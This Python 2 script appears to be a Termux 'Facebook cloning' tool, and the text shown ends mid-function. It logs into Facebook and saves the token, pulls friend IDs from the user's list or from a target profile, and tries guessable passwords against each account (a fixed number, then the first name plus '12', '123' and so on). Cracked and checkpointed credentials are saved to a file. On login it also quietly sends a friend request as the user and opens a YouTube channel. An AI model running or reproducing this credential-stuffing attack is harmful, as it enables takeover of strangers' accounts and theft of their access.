#!/usr/bin/python2
#coding=utf-8
#THE OFFICAL HACKER TECH ABM
#EDITING IS MY SCRIPT 
#FOLLOWS XP TRICKED
#SUBSCRIBE OUR YOUTUBE CHANNEL 
#FOLLOW MY SCRIPT 
#CHANNEL NAME [XP-TRICKER] 

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Gecko')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70')]
br.addheaders = [('User-Agent','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:TECH ABM

#### LOGO ####
logo = """
\033[1;92
██╗░░██╗██╗██████╗░██╗
╚██╗██╔╝██║██╔══██╗██║
░╚███╔╝░██║██║░░██║██║
░██╔██╗░██║██║░░██║██║
██╔╝╚██╗██║██████╔╝██║
╚═╝░░╚═╝╚═╝╚═════╝░╚═╝
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;91mAUTHOR : \033[0;92m REHMAT ALI                   \033[0;91m      ║
\033[0;91m║\033[0;91mGITHUB :\033[0;92m https://github.com/XIDIXP  \033[0;91m     ║
\033[0;91m║\033[0;91mYOUTUBE:\033[0;92m XIDI PAKISTANI XP TRICKER \033[0;91m   ║
\033[0;95m╰════════════════════════════════════════════╯

\033[1;94m⊱══════════════════⊱═⊰DISCLAIMER⊱═⊰══════════════════⊰
\033[1;91mWARNING :\033[1;93mUSE A FRESH ACCOUNT TO LOGIN, DO NOT USE OLD ACCOUNT LOGIN OTHERWISE YOUR ACCOUNT WILL BE BLOCK
\033[1;91mWIFI OR MOBILE DATA :\033[1;93mDO NOT USE WIFI, ONLY MOBILE DATA USE FOR CLONING 
\033[1;91mID NOT FOUND PROBLEM :\033[1;93mCOPY TO PROFILE PHOTO USERNAME AND THEN PASTE IN TERMUX
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")


jalan("\033[1;93m11111111111111111111111111111111111111111111 ")
jalan("\033[1;93m1111111111111111111111111¶¶111111111111111111 ")
jalan("\033[1;93m1111111111111111111111111¶¶111111111111111111 ")
jalan("\033[1;93m111111111111111111111111¶¶¶11¶¶11111111111111 ")
jalan("\033[1;93m1111111111111111111111¶¶¶¶¶¶¶¶¶11111111111111 ")
jalan("\033[1;93m111111111111111111111¶¶¶¶¶¶¶¶¶111111111111111 ")
jalan("\033[1;93m111111111111111111111¶¶¶¶¶¶¶¶¶111111111111111 ")
jalan("\033[1;93m11111111111111111111¶¶¶¶¶¶¶¶¶1111111111111111 ")
jalan("\033[1;93m11111111111111111111¶¶¶¶¶¶¶¶11111111111111111 ")
jalan("\033[1;93m1111111111111111111¶¶¶¶¶¶¶¶111111111111111111 ")
jalan("\033[1;93m111111111111111111¶¶¶¶¶¶¶¶¶111111111111111111 ")
jalan("\033[1;93m111111111111111111¶¶¶¶¶¶¶¶¶111111111111111111 ")
jalan("\033[1;93m11111111111111111¶¶¶¶¶¶¶¶¶¶¶11¶11111111111111 ")
jalan("\033[1;93m111111111111111111¶¶¶¶¶¶1¶¶¶¶¶¶11111111111111 ")
jalan("\033[1;93m1111111111111111111¶¶¶¶¶11¶¶¶¶111111111111111 ")
jalan("\033[1;93m111111111111111111111¶¶¶¶11111111111111111111 ")
jalan("\033[1;93m1111111111111111111111¶¶¶¶1111111111111111111 ")
jalan("\033[1;93m111111111111111111111111¶¶1111111111111111111 ")
jalan("\033[1;93m111111111111111111¶11111¶¶¶111111111111111111 ")
jalan("\033[1;93m111111111111111111¶¶1111¶¶¶111111111111111111 ")
jalan("\033[1;93m111111111111111111¶¶¶¶¶¶¶¶¶111111111111111111 ")
jalan("\033[1;93m1111111111111111111¶¶¶¶¶¶¶¶111111111111111111 ")
jalan("\033[1;93m111111111111111111111¶¶¶¶¶¶111111111111111111 ")
jalan("\033[1;93m1111111111111111111111¶¶¶¶¶111111111111111111 ")
jalan("\033[1;93m11111111111111111111111¶¶¶¶111111111111111111 ")
jalan("\033[1;93m111111111111111111111111¶¶¶111111111111111111 ")
jalan("\033[1;93m1111111111111111111111111¶¶111111111111111111 ")
jalan("\033[1;93m1111111111111111111111111¶¶¶11111111111111111 ")
jalan("\033[1;93m1111111111111111111111111¶¶¶11111111111111111 ")
jalan("\033[1;93m1111111111111111111111111¶¶¶11111111111111111 ")
jalan("\033[1;93m111111111111111111111111¶¶¶111111111111111111 ")
jalan("\033[1;93m1111111111111111111111¶¶¶¶¶111111111111111111 ")
jalan("\033[1;93m111111111111111111111¶¶¶¶11111111111111111111 ")
jalan("\033[1;93m111111111111111111111¶¶¶111111111111111111111 ")
jalan("\033[1;93m111111111111111111111¶¶¶111111111111111111111 ")
jalan("\033[1;93m1111111111111111111111¶¶1¶1111111111111111111 ")
jalan("\033[1;93m1111111111111111111111¶¶1¶¶111111111111111111 ")
jalan("\033[1;93m111111111¶¶¶¶111111111¶¶11¶¶11111111111111111 ")
jalan("\033[1;93m1111111¶¶¶¶¶¶¶¶1111111¶¶1¶¶¶11111111111111111 ")
jalan("\033[1;93m11111¶¶¶¶¶¶¶¶¶¶¶11111¶¶11¶¶¶11111111111111111 ")
jalan("\033[1;93m1111¶¶¶¶¶¶1111¶11111¶¶11¶¶¶¶11111111111111111 ")
jalan("\033[1;93m1111¶¶¶¶¶11111111111¶¶1¶¶¶¶¶11111111111111111 ")
jalan("\033[1;93m1111¶¶¶¶¶1111111111¶¶1¶¶¶¶¶¶11111111111111111 ")
jalan("\033[1;93m111¶¶¶¶¶¶111111111¶¶11¶¶¶¶¶¶1111111111¶¶¶1111 ")
jalan("\033[1;93m1111¶¶¶¶¶¶11111111¶¶1¶¶¶¶¶¶1111111111¶¶¶¶¶111 ")
jalan("\033[1;93m1111¶¶¶¶¶¶¶1111111¶¶1¶¶¶¶¶¶¶1111111111111¶¶11 ")
jalan("\033[1;93m1111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶1111111111111¶¶11 ")
jalan("\033[1;93m11111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶1111111111111¶¶11 ")
jalan("\033[1;93m11111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶11111111111¶¶¶11 ")
jalan("\033[1;93m111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶¶¶11 ")
jalan("\033[1;93m111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111 ")
jalan("\033[1;93m1111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111 ")
jalan("\033[1;93m11111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶1111111¶¶¶¶1111 ")
jalan("\033[1;93m11111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶111111111¶¶¶11111 ")
jalan("\033[1;93m11111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶1111111111¶¶¶11111 ")
jalan("\033[1;93m111111111¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶1111111111¶¶¶¶11111 ")
jalan("\033[1;93m111111111¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶1111111111¶¶¶¶11111 ")
jalan("\033[1;93m1111¶¶¶11¶¶¶¶¶¶¶¶¶¶11¶¶¶¶11111111111¶¶¶111111 ")
jalan("\033[1;93m1111¶¶¶¶1¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶11111111111¶¶¶111111 ")
jalan("\033[1;93m1111111¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶11111111111¶¶¶¶11111 ")
jalan("\033[1;93m111111¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶11111¶¶¶¶1111¶¶¶11111 ")
jalan("\033[1;93m11111¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶1111111¶¶¶111¶¶¶11111 ")
jalan("\033[1;93m1111¶¶¶1¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶1111111¶¶¶11¶¶¶¶1111 ")
jalan("\033[1;93m111¶¶¶1¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶1111111¶¶¶111¶¶¶1111 ")
jalan("\033[1;93m11¶¶¶11¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶111 ")
jalan("\033[1;93m11¶¶¶11¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111¶¶¶111 ")
jalan("\033[1;93m1¶¶¶¶1¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111¶¶¶¶11 ")
jalan("\033[1;93m1¶¶¶11¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶111111111¶¶¶11 ")
jalan("\033[1;93m1¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶1111111111¶¶¶¶1 ")
jalan("\033[1;93m1¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶111111111111¶¶¶1 ")
jalan("\033[1;93m1¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶11¶¶¶¶111111¶¶¶1 ")
jalan("\033[1;93m1¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶11¶¶¶11¶11111¶¶¶1 ")
jalan("\033[1;93m1¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶1¶¶¶11111111¶¶¶¶1 ")
jalan("\033[1;93m11¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶1¶¶111111111¶¶¶11 ")
jalan("\033[1;93m111¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶1¶¶¶1111111¶¶¶¶11 ")
jalan("\033[1;93m1111¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶1¶¶¶¶11¶¶¶¶¶¶111 ")
jalan("\033[1;93m11111¶¶¶¶¶¶111¶¶¶¶¶¶¶¶¶¶11¶¶¶¶1¶¶¶¶¶¶¶¶¶11111 ")
jalan("\033[1;93m1111111¶¶¶¶¶¶¶1111111111¶¶¶¶¶¶¶¶¶¶¶¶¶11111111 ")
jalan("\033[1;93m1111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111 ")
jalan("\033[1;93m1111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111111111111 ")
jalan("\033[1;93m111111111111111111111111111111111111111111111")
jalan("\033[1;95m█] 1⃣0⃣%") 
jalan("\033[1;95m​██] 2⃣0⃣%​  ")
jalan("\033[1;95m​███] 3⃣0⃣%​ ")
jalan("\033[1;95m​████] 4⃣0⃣%​")
jalan("\033[1;95m​█████] 5⃣0⃣%")
jalan("\033[1;95m​██████] 6⃣0⃣%​")
jalan("\033[1;95m​███████] 7⃣0⃣%​")
jalan("\033[1;95m​████████] 8⃣0⃣%​ ")
jalan("\033[1;95m​█████████] 9⃣0⃣%​ ")
jalan("\033[1;95m​██████████] 1⃣0⃣0⃣%​  ") 
os.system("clear") 
print  """
\033[1;94m
       ██▀▀▀▀███▀▀▀▀███▀▀▀▀██
       █┌─┐┌─┐█┌─┐┌─┐█┌─┐┌─┐█
       █└─┘└─┘█└─┘└─┘█└─┘└─┘█
       ██▌└┘▐███▌└┘▐███▌└┘▐██
       ██┼┼┼┼███┼┼┼┼███┼┼┼┼██
       ██▄▄▄▄███▄▄▄▄███▄▄▄▄██
\033[1;92m
  ┌┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┐
  ├┼┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┼┤
   \033[1;92mENTER TOOL USERNAME AND PASSWORD
  ├┼┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┼┤
  └┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┘  """
                

CorrectUsername = "XIDI"
CorrectPassword = "XIDI"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[#] \x1b[0;36m Enter Username\x1b[1;92m➤ ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[#] \x1b[0;36m Enter Password\x1b[1;92m➤ ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username  #DEV Tech-Abm
            loop = 'false'
        else:
            print "Wrong password!"
            os.system('xdg-open https://m.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
    else:
        print "Wrong username!"
        os.system('xdg-open https://m.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		##### LICENSE #####
#=================#
def lisensi():
	os.system('reset')
	masuk()

##### Pilih Login #####
def masuk():
	os.system('reset')
	print logo
	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;96m Login"
	print "\033[1;92m║--\033[1;91m> \033[1;95m2.\033[1;96m Login using token"
	print "\033[1;93m║--\033[1;91m> \033[1;95m0.\033[1;96m Exit"
	print "\033[1;95m║"
	msuk = raw_input("\033[1;96m╚═\033[1;1mD \033[1;93m")
	if msuk =="":
		print"\033[1;91m[!] Wrong input"
		keluar()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="0":
		keluar()
	else:
		print"\033[1;91m[!] Wrong input"
		keluar()
		

def login():
	os.system('reset')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('reset')
		print logo
		print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = raw_input('\033[1;96m[+] \x1b[1;94mPassword\x1b[1;32m: \x1b[1;32m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				os.system('xdg-open https://m.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			print("\n\033[1;92m[#] Harap Login Ulang !")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;91m[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			

def tokenz():
	os.system('reset')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			

def menu():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('reset')
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('reset')
		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[!] No connection"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰"   
	print "   \033[1;36;40m\033[1;32;40m[#] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"                               
	print "   \033[1;36;40m\033[1;32;40m[#] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
	print "   \033[1;36;40m\033[1;32;40m[#] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
	print "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰" 
	jalan( "\033[1;32;98m[1] \033[1;96m>>> start Cloning"		)																												
	jalan( "\033[1;32;98m[0] \033[1;96m>>> Log out")
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	jalan( "\x1b[1;32;92m[1]\033[1;33;98m>>> Attack From Friend List")
        jalan( "\x1b[1;32;92m[2] \033[1;33;98m>>> Attack From Public ID")
	jalan( "\x1b[1;32;92m[0] \033[1;33;98m>>> Back")
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	pilih_super()
	

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[1;92m[#] Getting IDs  \033[1;98m.')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;96m⊱⋕⊰═══════════════════════════════════════⊱⋕⊰\n" 
		idt = raw_input("\033[1;96m[⊱⋕⊰] Enter ID/USERNAME : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		jalan("\033[1;35;37m[⊱⋕⊰] Please wait...Process is running ■■■■■■■■□  ") 
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ■■■■■■■■□')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[⊱⋕⊰] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m      ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m  ❈"
	print """\033[1;96m╭╍══════════════════════════════════════════════╍╮ 
                           ║                                                        ║
	                   ║         <<<Hacking Start Please Wait>>>                ║
	         \033[1;96m╰╍══════════════════════════════════════════════╍╯"""
      
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = '786786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mHack\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mHack\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mHack\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mHack\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '786'
